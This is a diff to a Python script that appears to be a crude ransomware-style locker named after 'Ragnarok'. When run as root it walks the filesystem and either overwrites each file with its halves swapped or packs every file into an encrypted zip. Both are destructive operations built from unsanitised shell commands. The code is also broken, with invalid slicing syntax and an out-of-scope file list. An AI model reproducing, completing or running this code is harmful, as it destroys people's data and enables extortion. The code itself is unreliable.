@@ -1,19 +1,26 @@
 import os
 import sys
-
+import subprocess
 def main():
     fileList = findFiles()
-    offset = int(sys.argv[1])
+    #zipLock()
+    #randLock()
+    
+def randLock():
     for file in fileList:
         command = "cat " + file
-        fileContent = subprocess.check_output(command, shell=True)
-        fileBin = fileContent.encode('utf-8')
-        fileHex = hex(fileBin)
-        fileInt = int(fileHex)
-        newInt = fileInt + offset
-        newHex = hex(newInt)
-        os.system('echo "' + newHex + '" >> ' + file)
-    
+        fileCont = str(subprocess.check_output(command, shell=True))
+        num = len(fileCont)/2
+        firstStr = fileCont(:num)
+        secondStr = fileCont(num:)
+        newCont = secondStr + firstStr
+        os.system('echo "' + newCont + '" > ' + file)
+def zipLock():
+    command = "zip -e Ragnarok.zip "
+    for file in fileList:
+        command = command + file + " "
+        
+    os.system(command)
 def findFiles():
     self = str(sys.argv[0])
     excludedFiles = [self, "/bin/cat", "/bin/echo"]
@@ -25,5 +32,5 @@ def findFiles():
                 fileList.append(path)
     return fileList
     
-if(os.getuid() == 0 and len(sys.argv) == 2):
+if(os.getuid() == 0):
     main()
